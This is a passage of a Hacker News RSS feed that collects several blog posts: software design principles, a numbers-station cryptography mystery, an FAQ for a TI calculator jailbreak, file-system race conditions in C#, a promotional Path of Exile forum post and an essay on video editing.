and I shall continue to be mystified. Show me your tables,
and I won’t usually need your flowcharts; they’ll be obvious</p>

</blockquote>

<blockquote>
<p>Bad programmers worry about the code. Good programmers worry about data structures and their relationships.</p>

</blockquote>

<h2 id="measure-before-you-cut">Measure Before You Cut</h2>

<p>This is the most common mistake made by software developers.
It’s responsible for <em>many</em> self-inflicted problems.</p>

<p>The principle is that when you make a trade-off that has a complexity cost, ensure that
the need for the trade-off is backed by emprical evidence.</p>

<p>Common mistakes:</p>

<ul>
  <li>Trying to build a complex “scalable” system that scales to
a size you’ll never need.</li>
  <li>Making services as small as possible without considering
need or cost.</li>
  <li>Adding inconsistency or complexity for performance in a part
of the system that is not a performance bottleneck.</li>
</ul>

<p>Advice:</p>

<ul>
  <li>Start with the simplest, most correct system possible.</li>
  <li>Measure performance.</li>
  <li>Do not pay complexity costs or violate the other principles
until it solves an actual problem, not an imaginary one.</li>
  <li>Some optimisations can be made without measurement, because
they have very little or zero cost. For example, using the
correct data structures that support favourable performance
for the operations you want to perform.</li>
  <li>It’s true that sometimes experience alone can tell you if you’re making the
correct trade-off. It’s still better if you can prove it.</li>
  <li>When you have to choose, prefer correctness and simplicity over performance.</li>
  <li>In some cases correct and simple code is the best performing code!</li>
</ul>

<blockquote>
<p>The real problem is that programmers have spent far too much time
worrying about efficiency in the wrong places and at the wrong times;
premature optimization is the root of all evil (or at least most of
it) in programming.</p>

</blockquote>

<h2 id="avoid-trading-local-simplicity-for-global-complexity">Avoid Trading Local Simplicity for Global Complexity</h2>

<p>i.e. avoid making a part of the system simpler in exchange for making
the system as a whole more complex.</p>

<p>This trade is usually not an even one. Chasing after local simplicity can
cause and order of magnitude increase in global complexity.</p>

<p>For example, smaller services can make those services simpler,
but the reduction in consistency and the need for more inter-process
communication makes the system much more complicated.</p>

<h2 id="recognise-intrinsic-complexity">Recognise Intrinsic Complexity</h2>

<p>Sometimes things are just complicated. You cannot make problems simpler than they are.</p>

<p>Any attempt to do so will ironically make your system more complex.</p>

<h2 id="fewer-technologies-result-in-simpler-systems">Fewer Technologies Result in Simpler Systems</h2>

<p>It is better to understand a few technologies deeply than many
technologies at a surface level. Fewer technologies mean fewer
things to learn, and less operational complexity.</p>

<h2 id="focus-your-learning-on-concepts-not-technologies">Focus Your Learning on Concepts, not Technologies</h2>

<p>Do not concern yourself too much with intricate details of the software you use - you
can always look them up. Learn the underlying fundamental concepts.</p>

<p>Technologies change, concepts are eternal. The concepts you learn will
be used in newer technologies, and you will be able to learn them much quicker.</p>

<p>For example, do not concern yourself so much with the surface level
details of React, Kubernetes, Haskell, Rust, etc.</p>

<p>Focus on learning:</p>
<ul>
  <li>Pure functional programming</li>
  <li>The relational model</li>
  <li>Formal methods</li>
  <li>Logic programming</li>
  <li>Algebraic data types</li>
  <li>Typeclasses (in general and specific ones)</li>
  <li>The borrow checker (affine/linear types)</li>
  <li>Dependant Types</li>
  <li>The Curry-Howard Isomorphism</li>
  <li>Macros</li>
  <li>Homoiconicity</li>
  <li>VirtualDOM</li>
  <li>Linear regression</li>
  <li>etc.</li>
</ul>

<h2 id="code-consistency-is-important">Code Consistency is Important</h2>

<p>This is important for keeping the barrier to entry for understanding your code low.</p>

<p>Sometimes writing the consistent thing is more important than writing
the “correct” thing. If you want to change the way something works in
your codebase, change all instances of it.  Otherwise, try to stick
with it.</p>



<p>The more principles you have in common with your teammates, the better
you will work together, and the more you will enjoy working together.</p>

<h2 id="appendix-a-inconsistency-results-in-complexity">Appendix A: Inconsistency Results in Complexity</h2>

<p>This is the simplest example I can think of to illustrate this principle.
I hope it doesn’t require too much imagination to relate to realistic
problems.</p>

<p>Consider a database with two Boolean variables <code>x</code> and <code>y</code>. Your
application has a rule that <code>x = y</code>, and it can enforce this rule by
using a transaction to atomically change both variables.</p>

<p>If this rule is correctly enforced, your data can only be
in two states: <code>(x = True, y = True)</code> or <code>(x = False, y = False)</code>.</p>

<p>Writing the function ‘toggle’ with this rule in place is
straightforward. You atomically read one of the values and set both
values to the negation.</p>

<p>Now consider what happens if you split those variables into their own
databases and they can no longer be atomically changed together.</p>

<p>Because you can no longer consistently ensure that <code>x = y</code>, your data
can be in two more states: <code>(x = True, y = False)</code> or <code>(x = False, y = True)</code>.</p>

<ul>
  <li>Which value should you use if your system is in one of these states?</li>
  <li>What should your ‘toggle’ function do in one of these states?</li>
  <li>How do you ensure that both writes are successful when writing a new value?</li>
</ul>

<p>There are no correct answers to these questions.</p>

<p>Of course, if we’d followed the <a href="#make-invalid-states-unrepresentable">“make invalid states unrepresentable”</a> principle
in the first place, there would only be one variable! :)</p>

  </div>
</article></div>]]>
            </description>
            <link>http://kevinmahoney.co.uk/articles/my-principles-for-building-software/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512801</guid>
            <pubDate>Fri, 18 Sep 2020 03:50:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Cryptologic Mystery]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512546">thread link</a>) | @wglb
<br/>
September 17, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenćion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512546</guid>
            <pubDate>Fri, 18 Sep 2020 03:03:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ArTIfiCE is a jailbreak for TI CE calculators]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512502">thread link</a>) | @bane
<br/>
September 17, 2020 | https://yvantt.github.io/arTIfiCE/ | <a href="https://web.archive.org/web/*/https://yvantt.github.io/arTIfiCE/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="faqDiv">
                                    <p>Great question! A more detailed answer will make its way onto this page later on, but in summary: it gives back to users their legitimate right to enjoy a feature they paid for that TI unilaterally removed in the latest OS versions (allegedly for security reasons, but the bug that cheaters could in theory use was from TI and had nothing to do with ASM!)</p>

                                    <p>Delete the arTIfiCE appvar from the Memory menu (<tt>2nd</tt>+<tt>+</tt>). Depending on what you need to do, you may also want to delete any installed shell and trigger a RAM Reset as well (be sure to archive and/or backup your files first)</p>

                                    <p>Most probably not, considering arTIfiCE only executes a small piece of assembly code (which was previously possible in earlier OSes), and doesn't install anything persistent. Simply fully reset your calc and there will be no trace of it.</p>

                                    <p>arTIfiCE uses software bugs in the calculator's code to be able to execute assembly. A light "shell" is run allowing you to choose which program to launch. The source code may become available later on GitHub.</p>

                                    <p>Most likely, but many other bugs have been found that future versions of arTIfiCE may use :)</p>

                                    <p>No - arTIfiCE only restores functionality TI calculators had for dozens of years and removed in the latest OS. arTIfiCE is in no way a cheating tool, and cheating is not condoned here in any way.</p>

                                    <p>No - arTIfiCE resides in an "appvar" file (Application Variable, an 8xv file) and it will be deleted by the OS when going into Press-To-Test mode, just like most other appvars. You'll have to re-transfer+open it after your exam.</p>

                                    <p>No, or at least not directly: arTIfiCE only makes it possible for you to launch ASM programs, that's it. So you'd have to find a downgrade program for that (search for it on the usual websites).</p>

                                    <p>Sure, from the arTIfiCE shell, you can install another shell, for instance <a href="https://github.com/mateoconlechuga/cesium/releases/latest" target="_blank">Cesium</a>, which can be opened more quickly (thus you get to launch your programs more easily).</p>

                                    <p>Alright... The underlying exploit has a codename. In fact, all the underlying exploits found so far have fun codenames. They'll be released in due time :D</p>
                                </div></div>]]>
            </description>
            <link>https://yvantt.github.io/arTIfiCE/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512502</guid>
            <pubDate>Fri, 18 Sep 2020 02:55:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The File System is Unpredictable (2009)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512405">thread link</a>) | @azhenley
<br/>
September 17, 2020 | https://blog.paranoidcoding.com/2009/12/10/the-file-system-is-unpredictable.html | <a href="https://web.archive.org/web/*/https://blog.paranoidcoding.com/2009/12/10/the-file-system-is-unpredictable.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the more frequent questions I answer on StackOverflow is a variation of the following.</p>

<blockquote>
  <p>I’m doing XXX with a file, how can I know if the file exists?</p>
</blockquote>

<p>The variations include verify no one else has the file open, if the file is in use, the file is not writable, etc ‘. The answer to all of these questions is unfortunately the same. Simply put you can’t. The reason why is the fundamental nature of the file system prevents such predictive operations.</p>

<p>The file system is a resource with multiple levels of control that is shared between all users and processes in the system. The levels of control include but are not limited to file system and sharing permissions. At <strong>any</strong> point in time any entity on the computer may change a file system object or it’s controls in any number of ways. For example</p>

<ul>
  <li>The file could be deleted</li>
  <li>A file could be created at place one previously did not exist</li>
  <li>Permissions could change on the file in such a way that the current process does not have access</li>
  <li>Another process could open the file in such a way that is not conducive to sharing</li>
  <li>The user remove the USB key containing the file</li>
  <li>The network connection to the mapped drive could get disconnected</li>
</ul>

<p>Or in short</p>

<blockquote>
  <p>The file system is best viewed as a multi-threaded object over which you have no reliable synchronization capabilities</p>
</blockquote>

<p>Many developers, and APIs for that matter, though treat the file system as though it’s a static resource and assume what’s true at one point in time will be true later. Essentially using the result of one operation to predict the success or failure of another. This ignores the possibility of the above actions interweaving in between calls. It leads to code which reads well but executes badly in scenarios where more than one entity is changing the file system.</p>

<p>These problems are best demonstrated by a quick sample. Lets keep it simple and take a stab at a question I’ve seen a few times. The challenge is to write a function which returns all of the text from a file if it exists and an empty string if it does not. To simplify this problem lets assume permissions are not an issue, paths are properly formatted, paths point to local drives and people aren’t randomly ripping out USB keys. Using the System.IO.File APIs we may construct the following solution.</p>

<div><div><pre><code><span>static</span> <span>string</span> <span>ReadTextOrEmpty</span><span>(</span><span>string</span> <span>path</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>File</span><span>.</span><span>Exists</span><span>(</span><span>path</span><span>))</span> <span>{</span>
        <span>return</span> <span>File</span><span>.</span><span>ReadAllText</span><span>(</span><span>path</span><span>);</span> <span>// Bug!!!</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>return</span> <span>String</span><span>.</span><span>Empty</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This code reads great and at a glance looks correct but is actually fundamentally flawed. The reason why is the code changes depends on the call to File.Exist to be true for a large portion of the function. It’s being used to predict the success of the call to ReadAllText. However there is nothing stopping the file from being deleted in between these two calls. In that case the call to File.ReadAllText would throw a FileNotFoundException which is exactly what the API is trying to prevent!</p>

<p>This code is flawed because it’s attempting to use one piece of data to make a prediction about the future state of the file system. This is simply not possible with the way the file system is designed. It’s a shared resource with no reliable synchronization mechanism. File.Exists is much better named as File.ExistedInTheRecentPast (the name gets much worse if you consider the impact of permissions).</p>

<p>Knowing this, how could we write ReadTextOrEmpty in a reliable fashion’ Even though you can not make predictions on the file system the failures of operations is a finite set. So instead of attempting to predict successful conditions for the method, why not just execute the operation and deal with the consequences of failure?</p>

<div><div><pre><code><span>static</span> <span>string</span> <span>ReadTextOrEmpty</span><span>(</span><span>string</span> <span>path</span><span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
        <span>return</span> <span>File</span><span>.</span><span>ReadAllText</span><span>(</span><span>path</span><span>);</span>
    <span>}</span> <span>catch</span> <span>(</span><span>DirectoryNotFoundException</span><span>)</span> <span>{</span>
        <span>return</span> <span>String</span><span>.</span><span>Empty</span><span>;</span>
    <span>}</span> <span>catch</span> <span>(</span><span>FileNotFoundException</span><span>)</span> <span>{</span>
        <span>return</span> <span>String</span><span>.</span><span>Empty</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This implementation provides the original requested behavior. In the case the file exists, for the duration of the operation, it returns the text of the file and if not returns an empty string.</p>

<p>In general I find the above pattern is the best way to approach the file system. Do the operations you want and deal with the consequences of failure in the form of exceptions. To do anything else involves an unreliable prediction in which you still must handle the resulting exceptions.</p>

<p>If this is the case then why have File.Exist at all if the results can’t be trusted’ It depends on the level of reliability you want to achieve. In production programs I flag any File.Exist I find as a bug because reliability is a critical component. However you’ll see my personal powershell configuration scripts littered with calls to File.Exsit. Simply put because I’m a bit lazy in those scripts because critical reliability is not important when I’m updating my personal .vimrc file.</p>


    </div></div>]]>
            </description>
            <link>https://blog.paranoidcoding.com/2009/12/10/the-file-system-is-unpredictable.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512405</guid>
            <pubDate>Fri, 18 Sep 2020 02:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Path of Exile (Poe) Is a Worth Playing MMO – Five Reasons to Explain That]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24512371">thread link</a>) | @ChrisPineson
<br/>
September 17, 2020 | https://www.awow-tech.com/forum/topic/reasons-of-path-of-exile-why-you-really-need-to-play-path-of-exile/ | <a href="https://web.archive.org/web/*/https://www.awow-tech.com/forum/topic/reasons-of-path-of-exile-why-you-really-need-to-play-path-of-exile/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>You need to log in to create posts and topics.</p><div id="postid-1170"><div><div><p><a href="http://www.google.ae/url?q=https://eznpc.com/poe-currency"><img title="" src="https://lh3.googleusercontent.com/YpEB1sT8hT6WU2pqviNhZVrv6z-WZp3Z6jvQnf_j6nkLccp6FsKfkM_CqLaPX1rjOuTZsYJuwQAehpJYYBDm1N-aSyseDP6it2c2QZEibf9VkuK8d9dRWChdbapahCFE8WTwmo89CVw6CGxhBy76bWA9zFNrpcxoSdlLWvFLZZG0kDuQPClDlAGcvYcMj2pZs2we9cpCYY7VgjJo2hLGlltKfNtcYDvxGhkEGJn9zXeUstBfQ7c3Nx-E04j3as71baOyd1W4IrJ1S3UIw82ppje4TXzKmkZDfK2rsHuSMpKayTpt6mQ-MJYtJuwbTpmaDm589Wg03sIu7SttnBMEFSjoesCWSJ6RLTOm0nQzK2lo4np3VlaMU0pdjLYVU0t_uEpLp8iG-R7YSHep-wwCo5MQriXBxdy8N6tILdDT-Lk8xWc239hh9OPc3tMie1cJwk2MNX6QPFQjmeTDy6XDnrmJQOhiYxzx3AV_vmdt1bC0rmeDDdkHu0CLX87B_vLwTGxMYGxGe-bvKkHMGK9YbprrJOkphF-P88nDl5oZnQHwz4HdCuEGh5MsSpK-01JGce3Ghozj1h6aM99t0cAaY2WishVRakVfcfyvYBNSVwoCziSqnmztk-TVa50oQN-npAq3aAdkOvZ-hUqXsmGg8AsMwDaBbWntxJklPwNoA6tSrxCz52GS7EHO96Sp=w657-h329-no?authuser=0" alt="Why You Should Play Path of Exile" width="657" height="328"></a>As we all know the Path of Exile has been available for a very quite long time. Several days ago, they just launched their brand new and Free Delirium Expansion which concentrate on sending players off the grid to carve out a brand new section with passive skill and then encounter the worst nightmares over there and finally let players earn <a href="https://eznpc.com/poe-chaos-orb">PoE orbs</a>&nbsp;and Path of Exile Currency after finish this expansion successfully. Needless to say, a lot of unexpected things are certainly going on in this game. If you are now thinking of turning away from this game just because of the way it looks or the way it feels, then we recommend you to not do it! Cause, in fact, Path of Exile is a quite great ARPG (Action Role-Playing Game) that really deserves the praise and accolades it get from the online gaming community and now, here are five reasons for you to at least consider trying this out!</p>
<p>The very first one is: <strong>This Game Is Free To Play</strong></p>
<p>Who does not like Free Games? Even better, who does not like Free Games that are really excellent? Though Path of Exile offers some optional microtransactions (they have to earn money one way or the other after all), this game is totally free to download and play! Of course, it got off to a quite difficult start when the developer Grinding Gear Game (GGG) launched it firstly, but with tons of expansions, tweaks, and feedback from players, this game has improved drastically and now holds the torch as the best action role-playing video games to date. I have to admit that this game has set the standard that every other game of the same genre should follow!</p>
<p>The second one is: <strong>This Game Has Tons Of Content</strong></p>
<p>Here comes the question, if there's just one thing that Path of Exile is famous for, what would that be? For me, I might answer, that's the vast amount of content PoE has available. This game now has been successfully out for eight years, which means that it's packed full of great content. Though the developer Grinding Gear Games (GGG) has a reputation of sometimes rushing content (the Betrayal League is a great example of that) filled with glaring errors, the fact of the matter is you will be spoiled with so much stuff to do. And you have to admit that most of their expansions are top-notch, and you can sink your teeth into this endgame content easily for hours.</p>
<p>The third one is: <strong>This Game Has Awesome Developer Support</strong></p>
<p>The developer Grinding Gear Games (GGG) of Path of Exile, is always dedicated to continuously improving their game. They are always pushing for updates, from some minor patches every month to some big ones named Leagues. These Leagues give brand new methods to play this game, new loot to discover, and new skin to collect. If that's not enough to entice you into trying out Path of Exile, these Leagues come about 3-4 months! And the developer Grinding Gear Games (GGG) seems to want to ensure that their beloved game lasts forever, therefore, they consistently find unique methods to innovate upon what's have already there. Anyway, there's always something to look forward to!</p>
<p>The fourth one is: <strong>Guide Are Always Available In Path Of Exile</strong></p>
<p>Are you have trouble when choosing which melee equipment you need to use? Or maybe you are a little confused about the skill tree's use? You can find guides all over the Internet pretty easily, and that is mainly thanks to the tight-knit Path of Exile community! Wiki builds are abundant and new guides pop up almost every day. Whether it is a YouTube video to help you with power leveling or just in-depth written guides about all of the expansions, you should know there are plenty of guides to make your Exile in Wraeclast so much easier than before.</p>
<p>The community of Path of Exile is just insanely helpful, particularly to those new starters who are just figuring out this game. It's difficult to find fun games anymore as most are filled with toxicity (checking out League of Legends and DOTA 2). Here people will welcome you with just open arms, and if you are coming from games that are plagued with those toxic communities, then you will be taken aback by how nice everybody is on Path of Exile.</p>
<p>The fifth one is: <strong>This Is A Unique Game</strong></p>
<p>As you know, in most RPGs (Role-Playing Games), you just need to pick a class and the designate skill points to whichever stats you want to increase. Generally, you are just locked into a particular style of play. That is not the case in Path of Exile. Your skills and abilities are just linked to skill gems that are socketed into your very own gear, from your helmet to your boots. And now these gems will apply different abilities to your gear just depending on which you select. Path of Exile pushes players to personalize their own characters with the help of the massive skill tree and hundreds of gems to choose from. No role-playing game has ever implemented this kind of customization yet, making Path of Exile a quite unique experience unlike any other.</p>
<p>And above are our five reasons why you should start playing Path of Exile. Okay now, have we already convinced you to try and farm some rare items such as PoE orbs and <a href="https://eznpc.com/poe-currency">buy PoE currency online</a>&nbsp;for fun? If you are not, just post your comments down below and let us know why.</p>
</div>    </div>
</div><div id="postid-1181"><div><p><img alt="" src="https://secure.gravatar.com/avatar/bae48a4fafec9af9cb0512fbed819bc0?s=120&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/bae48a4fafec9af9cb0512fbed819bc0?s=240&amp;d=mm&amp;r=g 2x" height="120" width="120"></p><div><p><span><a href="https://www.awow-tech.com/forum/profile/dreamzweddingplanner2/">dreamzweddingplanner2</a></span><span>(@dreamzweddingplanner2)</span></p></div><p><small>2 Posts</small></p></div><div><div><p>looking for the Best wedding or an event planner to Organize a wedding or a party in udaipur, delhi, agra, India</p>
<p><a href="https://www.dreamzweddingplanner.com/services/wedding-planning/">Event planner</a></p>
</div>    </div>
</div></div>]]>
            </description>
            <link>https://www.awow-tech.com/forum/topic/reasons-of-path-of-exile-why-you-really-need-to-play-path-of-exile/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512371</guid>
            <pubDate>Fri, 18 Sep 2020 02:34:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why is video editing so horrible today?]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512292">thread link</a>) | @pavel_lishin
<br/>
September 17, 2020 | https://blog.rememberlenny.com/2020/09/15/why-is-video-editing-so-horrible-today/ | <a href="https://web.archive.org/web/*/https://blog.rememberlenny.com/2020/09/15/why-is-video-editing-so-horrible-today/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><main id="genesis-content"><article itemscope="" itemtype="https://schema.org/CreativeWork"><div itemprop="text"><p>Reading Time: 5 minutes read</p>




<p>In the last three months, I have done more video post-production than I have done in the past 12 years. Surprisingly, in these years, nothing seems to have changed. Considering how much media is now machine analyzable content, such as audio and visual, I’m surprised there aren’t more patterns that make navigating and arranging video content faster. Beyond that, I’m surprised there isn’t more process for programmatically composing video in a polished complimentary way to the existing manual methods of arranging.</p>



<p>In 1918, when the video camera was created, if you filmed something and wanted to edit it, you took your footage, cut it and arranged it according to how you wanted it to look. Today, if you want to edit a video, you have to import the source assets into a specialty program (such as Adobe Premiere), and then manually view each item to watch/listen for the portion that you want. Once you have the sections of each imported asset, you have to manually arrange each item on a timeline. Of course a ton has changed, but the general workflow feels the same.</p>



<div><figure><img src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/editing._D18377.jpg?resize=379%2C395&amp;ssl=1" alt="Should Critics and Festivals Give Editing Awards? Yes, and Here's Why |  IndieWire" width="379" height="395" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/editing._D18377.jpg?resize=379%2C395&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Real life photo of me navigating my Premiere assets folders</figcaption></figure></div>



<p>How did video production and editing not get its digital-first methods of creation? Computing power has skyrocketed. Access to storage is generally infinite. And our computers are networked around the world. How is it that the workflow of import, edit, and export take so long?</p>



<p>The consumerization of video editing has simplified certain elements by abstracting away seemingly important but complicated components, such as the linearity of time. Things like Tiktok seem to be the most dramatic shift in video creation, in that the workflow shifts from immediate review and reshooting of video. Over the years, the iMovies and such have moved timelines, from horizontal representation of elapsed time into general blocks of “scenes” or clips. The simplification through abstraction is important for the general consumer, but reduces the attention to detail. This creates an aesthetic of its own, which seems to be the result of the changing of tools. </p>



<p>Where are all the things I take for granted in developer tools, like autocomplete or class-method search, in the video equivalent? What is autocomplete look like in editing a video clip? Where are the repeatable “patterns” I can write once, and reuse everywhere? Why does each item on a video canvas seem to live in isolation from one another, with no awareness of other elements or an ability to interact with each other?</p>



